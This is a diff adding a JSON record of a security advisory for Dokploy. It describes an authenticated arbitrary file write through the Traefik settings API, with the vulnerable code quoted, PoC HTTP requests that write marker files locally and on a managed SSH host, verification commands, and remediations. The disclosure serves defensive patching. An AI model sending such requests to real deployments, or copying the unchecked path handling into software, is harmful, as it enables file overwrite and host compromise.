@@ -1,0 +1,46 @@
+{
+  "global": null,
+  "id": "GHSA-563h-6rxj-w49q",
+  "repo": {
+    "cve_id": null,
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": 8.3,
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:H/A:H"
+      },
+      "cvss_v4": {
+        "score": null,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [
+      "CWE-73"
+    ],
+    "description": "### Summary\r\nAn authenticated user with `traefikFiles:write` permission can supply an arbitrary filesystem path to `settings.updateTraefikFile`, causing Dokploy to write attacker-controlled content to that path. This enables arbitrary file overwrite in the Dokploy runtime environment and, when `serverId` is supplied, arbitrary file overwrite on a managed remote server over SSH.\r\n\r\n### Details\r\nThe vulnerable route is `settings.updateTraefikFile`:\r\n- /dokploy-0.28.8/apps/dokploy/server/api/routers/settings.ts#L556\r\n\r\nInput validation is insufficient:\r\n- /dokploy-0.28.8/packages/server/src/db/schema/user.ts#L159\r\n\r\n```ts\r\nexport const apiModifyTraefikConfig = z.object({\r\n  path: z.string().min(1),\r\n  traefikConfig: z.string().min(1),\r\n  serverId: z.string().optional(),\r\n});\r\n```\r\n\r\nThe write sink uses the attacker-controlled path directly:\r\n- /dokploy-0.28.8/packages/server/src/utils/traefik/application.ts#L224\r\n\r\n```ts\r\nexport const writeTraefikConfigInPath = async (\r\n  pathFile: string,\r\n  traefikConfig: string,\r\n  serverId?: string,\r\n) => {\r\n  const configPath = path.join(pathFile);\r\n  if (serverId) {\r\n    const encoded = encodeBase64(traefikConfig);\r\n    await execAsyncRemote(\r\n      serverId,\r\n      `echo \"${encoded}\" | base64 -d > \"${configPath}\"`,\r\n    );\r\n  } else {\r\n    fs.writeFileSync(configPath, traefikConfig, \"utf8\");\r\n  }\r\n};\r\n```\r\n\r\nTwo issues are present:\r\n- `path` is not restricted to the Traefik directory.\r\n- `serverId` is accepted by the write route without an organization ownership check before the remote write happens.\r\n\r\nThe remote execution helper resolves the server and executes the write over SSH:\r\n- /dokploy-0.28.8/packages/server/src/utils/process/execAsync.ts#L142\r\n- /dokploy-0.28.8/packages/server/src/services/server.ts#L37\r\n\r\nIn contrast, `readTraefikFile` does have a base-path restriction, so this is not a confirmed full arbitrary file read primitive.\r\n\r\n### PoC\r\nTested on Dokploy `v0.28.8`.\r\n\r\nTest account used:\r\n- `test@gmail.com / Bounty@1234`\r\n\r\n#### Variant 1: local arbitrary file write outside the Traefik directory\r\n1. Log in and obtain a `better-auth.session_token` cookie.\r\n2. Send:\r\n\r\n```http\r\nPOST /api/trpc/settings.updateTraefikFile?batch=1 HTTP/1.1\r\nHost: 127.0.0.1:3000\r\nContent-Type: application/json\r\nCookie: better-auth.session_token=<SESSION_TOKEN>\r\n\r\n{\"0\":{\"json\":{\"path\":\"/tmp/browser_traefik_write_probe\",\"traefikConfig\":\"browser-probe-local\"}}}\r\n{\"0\":{\"json\":{\"path\":\"/etc/dokploy/browser_traefik_write_probe_outside_traefik.txt\",\"traefikConfig\":\"browser-probe-local-etc\"}}}\r\n```\r\n\r\n3. Verify inside the Dokploy runtime container:\r\n\r\n```bash\r\ndocker exec dokploy-audit sh -lc 'ls -l /etc/dokploy/browser_traefik_write_probe_outside_traefik.txt && printf \"CONTENT:\" && cat /etc/dokploy/browser_traefik_write_probe_outside_traefik.txt'\r\n```\r\n\r\nObserved result:\r\n```text\r\n-rw-r--r-- 1 root root 23 ... /etc/dokploy/browser_traefik_write_probe_outside_traefik.txt\r\nCONTENT:browser-probe-local-etc\r\n```\r\n\r\n#### Variant 2: remote arbitrary file write\r\n1. Reuse the authenticated browser/session cookie.\r\n2. Send:\r\n\r\n```http\r\nPOST /api/trpc/settings.updateTraefikFile?batch=1 HTTP/1.1\r\nHost: 127.0.0.1:3000\r\nContent-Type: application/json\r\nCookie: better-auth.session_token=<SESSION_TOKEN>\r\n\r\n{\"0\":{\"json\":{\"path\":\"/audit-marker/browser_traefik_remote_write_probe_non_tmp.txt\",\"traefikConfig\":\"browser-probe-remote-audit-marker\",\"serverId\":\"case2server\"}}}\r\n```\r\n\r\n3. Verify on the managed server:\r\n\r\n```bash\r\ndocker exec audit-ssh-target sh -lc 'ls -l /audit-marker/browser_traefik_remote_write_probe_non_tmp.txt && printf \"CONTENT:\" && cat /audit-marker/browser_traefik_remote_write_probe_non_tmp.txt'\r\n```\r\n\r\nObserved result:\r\n```text\r\n-rw-r--r-- 1 root root 33 ... /audit-marker/browser_traefik_remote_write_probe_non_tmp.txt\r\nCONTENT:browser-probe-remote-audit-marker\r\n```\r\n\r\nBrowser-based validation:\r\n- The vulnerability was also replayed from an authenticated browser session on the `Traefik File System` page.\r\n<img width=\"1440\" height=\"1100\" alt=\"traefik-arbitrary-write-page\" src=\"https://github.com/user-attachments/assets/d65431d6-beb9-481f-b7cd-ba116ab31b75\" />\r\n\r\n\r\n### Impact\r\nThis is an authenticated arbitrary file write vulnerability.\r\n\r\nImpacted scenarios:\r\n- Local Dokploy runtime: arbitrary file overwrite inside the Dokploy execution environment.\r\n- Managed servers: arbitrary file overwrite on remote hosts reachable through Dokploy SSH management.\r\n\r\nPotential consequences:\r\n- Overwriting configuration files\r\n- Planting attacker-controlled files for follow-on exploitation\r\n- Service disruption\r\n- Remote host compromise when the overwritten path influences privileged services or deployment flows\r\n\r\n### Remediations\r\n- Restrict `path` to a canonicalized path under the intended Traefik base directory.\r\n- Enforce `path.resolve()` plus prefix checks instead of `path.join(pathFile)`.\r\n- Reject absolute paths and traversal attempts on the write route.\r\n- Validate that `serverId` belongs to the active organization before performing any remote write.\r\n- Prefer safe remote file transfer primitives over shell-based `echo ... > path` writes.",
+    "ghsa_id": "GHSA-563h-6rxj-w49q",
+    "html_url": "https://github.com/Dokploy/dokploy/security/advisories/GHSA-563h-6rxj-w49q",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-563h-6rxj-w49q"
+      }
+    ],
+    "published_at": "2026-11-12T08:17:50Z",
+    "references": [],
+    "severity": "high",
+    "summary": "Authenticated arbitrary file write in Traefik settings allows local and remote file overwrite",
+    "updated_at": "2026-11-12T08:17:50Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "other",
+          "name": "dokploy"
+        },
+        "patched_versions": "0.31.0",
+        "vulnerable_version_range": "< 0.31.0"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "Dokploy/dokploy"
+}
